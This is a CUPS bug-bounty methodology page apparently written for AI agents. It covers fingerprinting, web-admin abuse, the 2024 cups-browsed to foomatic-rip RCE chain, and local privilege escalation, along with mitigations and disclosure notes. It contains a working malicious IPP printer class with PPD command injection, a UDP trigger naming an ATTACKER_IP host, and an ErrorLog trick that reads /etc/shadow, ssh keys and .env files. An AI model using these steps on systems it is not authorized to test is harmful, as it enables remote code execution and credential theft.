---
technology: CUPS
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: print-infra
evidence: "2 writeups (see ../internal coverage ledger) — thin unit, upstream-weighted by design"
provenance: "corpus-mined from 2 writeups in the writeup corpus + upstream-verified: EvilSocket 'Attacking UNIX systems via CUPS Part I' (2024-09-26), jfrog.com CUPS RCE analysis, oligo.security mitigations post, Gentoo GLSA 201404-01 / CVE-2012-5519, the exploit-chain author's writeup blog, accessed 2026-11-12. CVE-to-component mapping checked against all four advisories (note: cups-browsed = CVE-2024-47176, NOT CVE-2024-47076 which is libcupsfilters)"
ht-source:
  - "rewritten from HackTricks (src/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp.md), CC BY-NC 4.0, accessed 2026-11-13"
---

Companion page: [[cups|CUPS overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# CUPS Bug Bounty Methodology

**Scope:** cupsd on TCP 631 (web admin + IPP), cups-browsed on UDP 631, the cups-filters/libppd/libcupsfilters pipeline, and local abuse as an lp/lpadmin user. **Out of scope:** raw printer languages on TCP 9100 (jetdirect unit), vendor print managers.

**Authorization:** presumes written permission. The UDP chain **queues state on the target** (a printer object persists in the CUPS config) — flag queue/config changes as DESTRUCTIVE, and remove the malicious printer when done. Never print to a real physical device.

## Decision tree (one screen)

1. 631/tcp open (nmap `ipp`, `CUPS x.y` banner) → Phase 1 → web UI reachable → Phase 2.
2. 631/tcp loopback-only but you have a shell → forward it (chisel/ssh -L) → Phase 2.
3. 631/udp open|filtered with cups-browsed likely → Phase 3 (the 2024 chain) — check version gates first.
4. Local shell in `lp`/`lpadmin` groups → Phase 4 (ErrorLog read if < 1.6.2, queue enum otherwise).

## Phase 1 — Fingerprinting

```bash
nmap -sV -p 631 198.51.100.10          # 631/tcp open ipp  CUPS 2.4;  |_http-title: Home - CUPS 2.4.2
nmap -sU -p 631 198.51.100.10          # 631/udp open|filtered ipp  → cups-browsed candidate
curl -s http://198.51.100.10:631/ | head   # Home page leaks version; /admin asks for creds
lpstat -t                               # local: full printer + queue state
```

Observed marker: `631/tcp open ipp CUPS 2.4` with `Service Info: OS: Linux` — an *externally bound* 631 already means misconfiguration; one observed host also allowed **anonymous** web access and printing a test page.

Version → surface map:

| Version | Surface |
|---|---|
| CUPS < 1.6.2 | CVE-2012-5519: lpadmin-settable directives (ErrorLog) → file read/write as cupsd user (root on old installs) |
| cups-browsed ≤ 2.0.1, libcupsfilters ≤ 2.1b1, libppd ≤ 2.1b1, cups-filters ≤ 2.0.1 | CVE-2024-47176 / -47076 / -47175 / -47177 chain → RCE as lp |

NSE companions (added 2026-11-13, rewritten from HackTricks): the CUPS
script family adds queue-level recon to the version banner —
`nmap -sV -p 631 --script cups-info,cups-queue-info <target>` returns
model, printer state and queue statistics (`cups-info`) plus pending-job
enumeration (`cups-queue-info`) without touching the web UI; `--script
cups*` runs the whole family.

## Phase 2 — Web admin / 631-TCP surface

- `http://TARGET:631/` — Home (printers, jobs, version), `Administration` (config UI; lpadmin creds), `/admin/log/error_log` (log viewer).
- Anonymous UI access yields: printer names, queue depth, CUPS version — cheap recon, zero side effects.
- With lpadmin (UI or `cupsctl`), the observed ErrorLog primitive (CUPS < 1.6.2):

```bash
cupsctl ErrorLog="/etc/shadow"                          # repoint the error log
curl -s http://127.0.0.1:631/admin/log/error_log        # → file contents (cupsd runs as root)
# same read for /root/root.txt, app .env files, ssh keys
```

**DESTRUCTIVE (config change):** restore `cupsctl ErrorLog="/var/log/cups/error_log"` afterwards.

## Phase 3 — The 2024 CUPS chain (UDP 631 → RCE as lp)

Preconditions (all four must hold on unpatched components): cups-browsed running and bound `INADDR_ANY:631/udp`; libcupsfilters/libppd unpatched (PPD written from IPP attributes); foomatic-rip with `FoomaticRIPCommandLine` honored; a job printed to the injected printer to trigger execution. Chain, per the advisories:

1. **CVE-2024-47176 (cups-browsed ≤ 2.0.1)** — a single unauthenticated UDP packet to 631 (broadcast or **unicast**, the listener does not differentiate) naming an attacker IPP URL makes the target fetch printer attributes.
2. **CVE-2024-47076 (libcupsfilters ≤ 2.1b1)** — `cfGetPrinterAttributes5` accepts the malicious attributes unsanitized.
3. **CVE-2024-47175 (libppd ≤ 2.1b1)** — `ppdCreatePPDFromIPP2` writes them into a PPD; a `"\n` inside an attribute value (e.g. `printer-more-info`) escapes the quoted field and injects a new PPD line.
4. **CVE-2024-47177 (cups-filters ≤ 2.0.1)** — `foomatic-rip` executes the injected `*FoomaticRIPCommandLine` when a job runs. CVSS 9.9.

Observed shape for steps 1–3, using the python `ippserver` library:

```python
class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super().__init__()
    def printer_list_attributes(self):
        return {
            (SectionEnum.printer, b'printer-uri-supported', TagEnum.uri): [self.printer_uri],
            (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
                f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : '
                '"application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],
        }
# serve it (e.g. ippserver on port 12345), then make the target install the printer:
#   echo 0 | nc -u -q1 TARGET_IP 631    # or the PoC's packet: ipp://ATTACKER_IP:12345/printers/whatever
```

Trigger (the step everyone forgets): execution happens **only when a job prints**. Options: wait for a user, or use the web UI — `Printers → <malicious printer> → Maintenance → Print Test Page` (done exactly this way, with anonymous access to 631, in an observed engagement). Result: command execution as `lp`.

**DESTRUCTIVE:** the installed printer persists in the CUPS config — delete it (`lpadmin -x <printer>` or admin UI) after testing. Mitigations to report: disable cups-browsed, block/avoid UDP 631 exposure, patch cups/cups-filters ≥ the Sept–Oct 2024 releases.

## Phase 4 — Local lp/lpadmin post-foothold

```bash
id                                   # lp (use printers), lpadmin (manage printers/jobs)
lpstat -p -d                         # printers + default
lpstat -o                            # pending jobs (other users' documents = data exposure)
lpadmin -p example-printer -o        # manage (lpadmin-group only)
cupsctl                              # read current directives (add one to change them)
```

Group meanings as observed: `lp` — enable/use printers; `lpadmin` — manage printers and **other users' pending jobs**. On < 1.6.2 add the Phase 2 ErrorLog read; otherwise document queue/document exposure.

## Phase 4.5 — Retained job files and printer URIs: document disclosure (added 2026-11-13)

Rewritten from HackTricks; mechanics checked against CUPS documentation.

**Retained spool data.** When CUPS keeps job files, the document you want is
on disk under `/var/spool/cups` as `d00001-001`-style names (job 1,
document 1; more digits for larger job IDs). The directory commonly permits
traversal but denies listing, so a blind `find` misses a readable file whose
job number you know. Get the numbers from the scheduler itself:
`lpstat -h localhost -W completed -o` lists completed job IDs (`-W` must
precede `-o`), then check permissions on the matching `d…` path before
opening it. Two gating facts for the report: `PreserveJobFiles` controls
retention and its default has varied across releases — job *history* alone
does not mean the document data is still on disk — and the scheduler may
restrict which jobs a caller can list. A document that prints a credential
is a lead, not a compromise: access to the account still needs password
reuse to be real.

**Printer URIs carrying credentials.** A `DeviceURI` in `printers.conf` can
embed a printer username and password. The active `/etc/cups/printers.conf`
is permission-restricted precisely for this, but backup copies, caches, and
deployment-tool snapshots often are not — inventory the path and note the
credential's presence without echoing its value; using it against a more
privileged account needs independent proof of reuse plus a working
authentication.

## Phase 5 — Local privilege escalation: CVE-2024-35235 (added 2026-11-13)

Verified against the Debian tracker/Ubuntu record (OpenPrinting CUPS ≤ 2.4.8,
patched upstream in commit ff1f8a62): when `cupsd` starts with a `Listen`
directive pointing at a **symbolic link**, the daemon chmods the target —
an attacker-chosen path becomes world-writable, and cupsd often runs as
root. On Ubuntu the AppArmor context limits which files are reachable, but
the same research demonstrated the full chain there: the symlink chmod leads
to control of `cupsd.conf`/`cups-files.conf`, whose `User`/`Group`
directives plus a PPD with `FoomaticRIPCommandLine` yield command execution
as an arbitrary user — and full root on Ubuntu. Engagement framing: this is
a local lane for whoever can influence or race the config (win the bind-time
race, plant the symlink), sibling to the Phase 2/3 network lanes, and the
"world-writable file of your choice" primitive is the finding even where
the full chain does not land.

## Lab note — ippeveprinter for client-side tests (added 2026-11-13)

CUPS ships its own rogue-printer server (no hardware needed): `ippeveprinter`
advertises an IPP Everywhere printer over DNS-SD, can demand HTTP Basic auth
via PAM (`-A`), write rendered jobs to a directory (`-D <dir>`), execute a
helper per printed document (`-c <command>`), keep spooled documents
(`-k`), and pick its port (`-p`) — flags verified against its man page.
Use it to test how clients (and users) behave against unknown printers,
credential prompts, and job handling — the benign counterpart to the
Phase 3 `ippserver` chain.

## Disclosure notes

- The 2024 chain is unauthenticated **from the network** but lands as `lp` — report as pre-auth RCE with low-privilege landing, and check whether the `lp` user's spool access or config write leads further (old installs: cupsd-as-root directives).
- CVE-2012-5519 needs an lpadmin-class author (local group or UI creds) — it is a local privilege escalation to the cupsd user (root on defaults of that era), not remote.
- Anonymous 631 web access alone is an information-disclosure finding (versions, printers, jobs), even when both chains are patched.

## Appendix A — Tool mapping (prose)

- **nmap** — `-sV -p 631` / `-sU -p 631` fingerprinting; http-robots/http-title probes give the CUPS version.
- **curl** — web UI and `/admin/log/error_log` interaction.
- **cupsctl** — read/set cupsd directives from a shell.
- **lpstat / lpadmin / lp / cancel** — queue enumeration, printer management, test-page trigger, cleanup.
- **ippserver (python library)** — the malicious IPP server for the 2024 chain; the public PoCs wrap the class above.
- **chisel / ssh -L** — forwarding loopback 631 to your browser.
